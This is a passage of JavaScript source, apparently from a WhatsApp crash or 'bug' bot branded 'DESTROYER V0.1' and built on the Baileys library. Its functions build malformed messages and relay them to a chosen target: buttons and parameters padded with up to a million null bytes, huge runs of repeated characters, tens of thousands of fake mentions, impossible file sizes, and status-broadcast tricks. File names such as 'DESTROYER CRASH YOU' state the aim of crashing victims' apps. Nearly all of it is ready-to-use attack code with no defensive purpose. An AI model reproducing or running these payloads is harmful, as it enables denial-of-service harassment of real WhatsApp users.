                  "— 𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣\n" + "ꦾ".repeat(30000) +
                  "\u0000".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "SiJomokKenapaJirr",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function Loc(target, jids) {
  let pesan = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
          message: {
              interactiveMessage: {
                  header: {
                      title: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣",
                      locationMessage: {},
                      hasMediaAttachment: true
                  },
                  body: {
                      text: "*𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣*"
                  },
                  nativeFlowMessage: {
                      buttons: [{
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }, {
                          name: "single_select",
                          buttonParamsJson: `{"title":"${"\u0000".repeat(99999)}","sections":[{"title":"Flow Button","rows":[]}]}`
                      }]
                  }
              }
          },
          carouselMessage: {
              cards: []
          }
      }
  }), {
      userJid: target,
      quoted: null
  });

  await uwu.relayMessage(target, pesan.message, jids ? {
      participant: {
          jid: target
      }
  } : {});
}

async function Notifattack(target) {
  uwu.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣` + "࣯ꦾ".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣" + "ꦾ".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

async function doc(target) {
  var doc = generateWAMessageFromContent(from, proto.Message.fromObject({
    "documentMessage": {
      "cta_url": "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
      "mimetype": "application/pdf",
      "fileSha256": "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
      "fileLength": 99999999999999,
      "pageCount": 99999999999999,
      "contactVcard": true,
      "caption": '𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣',
      "mediaKey": "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
      "fileName": '𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣 ',
      "fileEncSha256": "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
      "directPath": "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
      "mediaKeyTimestamp": "1714145232",
      "thumbnailDirectPath": "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
      "thumbnailSha256": "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
      "thumbnailEncSha256": "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
      "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
      "thumbnailHeight": 172,
      "thumbnailWidth": 480
    }
  }),{ userJid: from })
  uwu.relayMessage(target, doc.message, {messageId: doc.key.id })
}

async function TagWhatsApp1(target, Ptcp = false) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const contextInfo = {
        mentionedJid, stanzaId: "1234567890ABCDEF", participant: "0@s.whatsapp.net",
        quotedMessage: { callLogMesssage: { isVideo: true, callOutcome: "1", durationSecs: "0", callType: "REGULAR",
            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] } },
        remoteJid: target, forwardingScore: 9999999, isForwarded: true,
        externalAdReply: { title: "", body: "", mediaType: "VIDEO", renderLargerThumbnail: true,
            thumbnail: "https://files.catbox.moe/wmmjgf.png", sourceUrl: "https://www.instagram.com/WhatsApp" }
    };

    await uwu.relayMessage(target, { 
        extendedTextMessage: { 
            text: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣 -" + "@0".repeat(90000), 
            contextInfo 
        } 
    }, Ptcp ? { participant: { jid: target } } : {});
}	

const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣 ϟ ‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}

async function LocInvisi(target, Ptcp = true) {
				let marszll = "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣"
			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "\u0000" +  "ꦾ".repeat(90000),
								locationMessage: {},
								hasMediaAttachment: false
							},
							body: {
								text: marszll
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(400000), 
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: target,
				quoted: EsQl
			});

			await uwu.relayMessage(target, etc.message, Ptcp ? {
				participant: {
					jid: target
				}
			} : {});
};

async function SockMentionJid3(target, Ptcp = false) {
      await uwu.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ" + "@0".repeat(100000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 15000,
                  },
                  () => `1${Math.floor(Math.random() * 600000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " target ",
              conversionData: "",
              conversionDelaySeconds: 20,
              forwardingScore: 9999999,
              isForwarded: false,
              quotedAd: {
                advertiserName: " target ",
                mediaType: "IMAGE",
                jpegThumbnail: thumbnailreply,
                caption: " target ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "\0",
                body: "\0",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: thumbnailreply,
                sourceType: " target ",
                sourceId: " target ",
                sourceUrl: "https://www.facebook.com/WhatsApp",
                mediaUrl: "https://www.facebook.com/WhatsApp",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.facebook.com/WhatsApp",
              },
              groupSubject: " target ",
              parentGroupJid: "120363321780343299-0@g.us",
              trustBannerType: " target ",
              trustBannerAction: 1,
              isSampled: true,
              utm: {
                utmSource: " target ",
                utmCampaign: " target ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299-0@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

async function XeonXRobust(target, Ptcp = true) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await uwu.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "𝔻𝔼𝕊𝕋ℝ𝕆𝕐𝔼ℝ ℂℝ𝔸𝕊ℍ 𝕐𝕆𝕌",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: thumbnailreply,
         },
         hasMediaAttachment: true,
        },

									body: { text: '𝔻𝔼𝕊𝕋ℝ𝕆𝕐𝔼ℝ ℂℝ𝔸𝕊ℍ 𝕐𝕆𝕌' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝔻𝔼𝕊𝕋ℝ𝕆𝕐𝔼ℝ ℂℝ𝔸𝕊ℍ 𝕐𝕆𝕌",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: thumbnailreply,
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}

  const { generateWAMessageFromContent, generateMessageID } = require('@adiwajshing/baileys');

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u0300 – \u036F",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u0300 – \u036F",
                                    title: "\u0300 – \u036F",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/putraxlow_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await uwu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await uwu.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function StxCuiSh(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: uwu.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝔻𝔼𝕊𝕋ℝ𝕆𝕐𝔼ℝ ℂℝ𝔸𝕊ℍ 𝕐𝕆𝕌",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "𝔻𝔼𝕊𝕋ℝ𝕆𝕐𝔼ℝ ℂℝ𝔸𝕊ℍ 𝕐𝕆𝕌"
                    },
                },
              },
            body: {
              text: "𝔻𝔼𝕊𝕋ℝ𝕆𝕐𝔼ℝ ℂℝ𝔸𝕊ℍ 𝕐𝕆𝕌" + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\0".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\0".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await uwu.relayMessage(target, message, {
      participant: { jid: target },
    });
  }

async function nullQ(target) {
  let mentioned = Array.from({ length: 100000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );

  await uwu.relayMessage(target, {
    listResponseMessage: {
      title: "@luckzinios",
      listType: 2,
      buttonText: null,
      sections: null,
      singleSelectReply: { selectedRowId: "X" },
      contextInfo: {
        mentionedJid: mentioned,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: ["13135550002@s.whatsapp.net"],
        quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "@luckzinios",
              format: 1
            },
            nativeFlowResponseMessage: {
              name: "menu_options",
              paramsJson: "\u0000".repeat(900000),
              version: 3
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741
            }
          }
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      }
    },
    description: "X"
  }, {
    participant: { jid: target }
  });
}

async function enviarBugStickerCrash(jid) {
  let stickersFake = [];
  for (let i = 0; i < 1000; i++) {
    stickersFake.push({
      fileName: "8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp",
      isAnimated: true,
      accessibilityLabel: '',
      isLottie: false,
      mimetype: "image/webp"
    });
  }

  const payload = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\0".repeat(1000000),
          version: 3
        },
        stickerPackMessage: {
          stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
          name: "𝔻𝔼𝕊𝕋ℝ𝕆𝕐𝔼ℝ ℂℝ𝔸𝕊ℍ 𝕐𝕆𝕌",
          publisher: '',
          stickers: stickersFake,
          fileLength: '999999999999999',
          fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
          fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
          mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
          directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0",
          mediaKeyTimestamp: "99999999",
          trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
          thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
          thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
          thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
          thumbnailHeight: 1000000000000,
          thumbnailWidth: 999999999999,
          imageDataHash: "OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==",
          stickerPackSize: 999999999999,
          stickerPackOrigin: 999999999999,
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => '1' + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: jid,
            remoteJid: jid,
            forwardingScore: 9741,
            isForwarded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: jid
            },
            externalAdReply: {
              title: "𝔻𝔼𝕊𝕋ℝ𝕆𝕐𝔼ℝ ℂℝ𝔸𝕊ℍ 𝕐𝕆𝕌",
              body: "𝔻𝔼𝕊𝕋ℝ𝕆𝕐𝔼ℝ ℂℝ𝔸𝕊ℍ 𝕐𝕆𝕌"
            }
          }
        }
      }
    }
  };

  await uwu.relayMessage(jid, payload, {});
}

async function protocolbug6(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await uwu.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

const {
  trava1
} = require("./travas/trava1.js");
const {
  trava8
} = require("./travas/trava8.js");
const {
  trava12
} = require("./travas/trava12.js");
const {
  travadoc
} = require("./travas/travadoc.js");

async function enviarPayloadMassivo(jid, usarParticipante = true) {
  try {
    for(let i = 0; i < 5; i++) {
      await uwu.relayMessage(jid, {
      extendedTextMessage: {
        text: "𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣ㇱ¿? " + 
              "ꦾ".repeat(103000) + " " + 
              "@0".repeat(25000),

        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net", 
            ...Array.from({ length: 15000 }, () => Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          participant: "0@s.whatsapp.net",
          quotedMessage: {
